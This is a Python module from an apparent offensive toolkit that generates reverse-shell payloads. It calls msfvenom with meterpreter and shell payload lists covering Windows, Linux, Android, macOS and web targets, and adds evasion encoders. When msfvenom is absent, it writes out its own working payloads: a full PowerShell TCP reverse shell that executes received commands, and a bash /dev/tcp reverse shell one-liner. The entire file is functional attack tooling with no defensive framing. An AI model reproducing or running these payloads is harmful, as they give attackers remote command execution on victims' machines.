import subprocess
import os
import uuid

MSF_PAYLOADS = {
    "windows": {
        "x64": [
            "windows/x64/meterpreter/reverse_tcp",
            "windows/x64/meterpreter/reverse_https",
            "windows/x64/shell/reverse_tcp",
            "windows/x64/exec",
            "windows/x64/meterpreter_reverse_tcp",
            "windows/x64/meterpreter_reverse_https",
            "windows/x64/shell_reverse_tcp",
        ],
        "x86": [
            "windows/meterpreter/reverse_tcp",
            "windows/meterpreter/reverse_https",
            "windows/shell/reverse_tcp",
            "windows/exec",
            "windows/meterpreter_reverse_tcp",
            "windows/meterpreter_reverse_https",
            "windows/shell_reverse_tcp",
        ]
    },
    "linux": {
        "x64": [
            "linux/x64/meterpreter/reverse_tcp",
            "linux/x64/shell/reverse_tcp",
            "linux/x64/exec",
            "linux/x64/meterpreter_reverse_tcp",
            "linux/x64/shell_reverse_tcp",
        ],
        "x86": [
            "linux/x86/meterpreter/reverse_tcp",
            "linux/x86/shell/reverse_tcp",
            "linux/x86/exec",
            "linux/x86/meterpreter_reverse_tcp",
            "linux/x86/shell_reverse_tcp",
        ]
    },
    "android": {
        "arm64": [
            "android/meterpreter/reverse_tcp",
            "android/meterpreter/reverse_https",
            "android/shell/reverse_tcp",
        ]
    },
    "macos": {
        "x64": [
            "osx/x64/meterpreter/reverse_tcp",
            "osx/x64/shell_reverse_tcp",
            "osx/x64/meterpreter_reverse_tcp",
            "osx/x64/shell_reverse_tcp",
        ]
    },
    "web": {
        "php": [
            "php/meterpreter/reverse_tcp",
            "php/reverse_php",
        ],
        "python": [
            "python/meterpreter/reverse_tcp",
            "python/shell_reverse_tcp",
        ],
        "java": [
            "java/meterpreter/reverse_tcp",
            "java/shell_reverse_tcp",
        ]
    }
}

ENCODERS = ["none", "x86/shikata_ga_nai", "x64/xor", "cmd/powershell_base64", "x86/alpha_mixed", "x86/unicode_upper"]

OUTPUT_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), "generated_payloads")


def _ensure_output_dir():
    if not os.path.exists(OUTPUT_DIR):
        os.makedirs(OUTPUT_DIR)


def _detect_msfvenom():
    try:
        result = subprocess.run(["msfvenom", "--help"], capture_output=True, timeout=5)
        return result.returncode == 0 or b"Usage:" in result.stdout
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass
    common_paths = [
        "/usr/bin/msfvenom",
        "/usr/local/bin/msfvenom",
        "/opt/metasploit-framework/msfvenom",
    ]
    for p in common_paths:
        if os.path.exists(p):
            return True
    return False


def get_payload_list(platform=None):
    result = {}
    for plat, archs in MSF_PAYLOADS.items():
        if platform and plat != platform:
            continue
        result[plat] = {}
        for arch, payloads in archs.items():
            result[plat][arch] = payloads
    return {"status": "success", "payloads": result, "encoders": ENCODERS, "msfvenom_available": _detect_msfvenom()}


def generate_payload(platform, lhost, lport, payload_type=None, encoder="none", iterations=0, arch=None, output_format="exe"):
    if not _detect_msfvenom():
        return _build_standalone_generator(platform, lhost, lport, payload_type)

    _ensure_output_dir()
    plat_config = MSF_PAYLOADS.get(platform, {})
    if arch and arch in plat_config:
        available = plat_config[arch]
    else:
        available = []
        for a in plat_config.values():
            available.extend(a)

    if not available:
        return {"status": "error", "message": f"No payloads for platform: {platform}"}

    selected = payload_type if payload_type and payload_type in available else available[0]
    ext_map = {"windows": "exe", "linux": "elf", "android": "apk", "macos": "macho", "web": "raw"}
    ext = ext_map.get(platform, "bin")
    if output_format == "raw":
        ext = "bin"
    elif output_format == "python":
        ext = "py"
    elif output_format == "powershell":
        ext = "ps1"
    elif output_format == "bash":
        ext = "sh"

    filename = f"payload_{platform}_{arch or 'auto'}_{uuid.uuid4().hex[:6]}.{ext}"
    filepath = os.path.join(OUTPUT_DIR, filename)

    cmd = ["msfvenom", "-p", selected, f"LHOST={lhost}", f"LPORT={lport}", "-f", output_format, "-o", filepath]

    if encoder and encoder != "none":
        cmd.extend(["-e", encoder])
        if iterations > 0:
            cmd.extend(["-i", str(iterations)])

    if platform == "windows" and ext == "exe":
        cmd.insert(1, "-a")
        cmd.insert(2, arch or "x64")
        cmd.insert(3, "--platform")
        cmd.insert(4, "windows")

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60, cwd=OUTPUT_DIR)
        if result.returncode != 0 or not os.path.exists(filepath):
            return {"status": "error", "message": f"msfvenom failed: {result.stderr[:500]}"}

        size = os.path.getsize(filepath)
        from core.db import log_payload
        log_payload(selected, platform, lhost, lport)

        return {
            "status": "success",
            "filename": filename,
            "filepath": filepath,
            "size_bytes": size,
            "payload_type": selected,
            "platform": platform,
            "lhost": lhost,
            "lport": lport,
            "command": " ".join(cmd)
        }
    except subprocess.TimeoutExpired:
        return {"status": "error", "message": "msfvenom timed out"}
    except Exception as e:
        return {"status": "error", "message": str(e)}


def _build_standalone_generator(platform, lhost, lport, payload_type=None):
    payloads = {
        "windows": {
            "ps1": (
                "payload.ps1",
                f"""$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}
$client.Close()"""
            ),
            "exe": (
                "payload_generation_instructions.txt",
                f"msfvenom not found. Install metasploit-framework or use the standalone PS1 payload.\n"
                f"Manual generation: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o payload.exe"
            )
        },
        "linux": {
            "elf": (
                "payload.sh",
                f"#!/bin/bash\nbash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
            )
        },
        "android": {
            "apk": (
                "payload_generation_instructions.txt",
                f"msfvenom not found. Install metasploit-framework.\n"
                f"Manual: msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o payload.apk"
            )
        }
    }

    plat_payloads = payloads.get(platform, payloads["linux"])
    list(plat_payloads.keys())[0]
    filename, content = list(plat_payloads.values())[0]

    _ensure_output_dir()
    filepath = os.path.join(OUTPUT_DIR, filename)
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(content)

    return {
        "status": "success",
        "filename": filename,
        "filepath": filepath,
        "size_bytes": len(content.encode("utf-8")),
        "payload_type": "standalone",
        "platform": platform,
        "lhost": lhost,
        "lport": lport,
        "command": f"Standalone payload (msfvenom not available). Saved to {filepath}",
        "standalone": True
    }


def get_msf_rpc_status():
    try:
        result = subprocess.run(["msfrpcd", "-h"], capture_output=True, timeout=3)
        available = result.returncode == 0
    except (FileNotFoundError, subprocess.TimeoutExpired):
        available = False
    return {"status": "success", "msfrpcd_available": available, "msfvenom_available": _detect_msfvenom()}


def list_generated_payloads():
    _ensure_output_dir()
    files = []
    try:
        for f in os.listdir(OUTPUT_DIR):
            fp = os.path.join(OUTPUT_DIR, f)
            if os.path.isfile(fp):
                files.append({
                    "filename": f,
                    "size_bytes": os.path.getsize(fp),
                    "modified": os.path.getmtime(fp)
                })
    except Exception:
        pass
    return {"status": "success", "payloads": files}
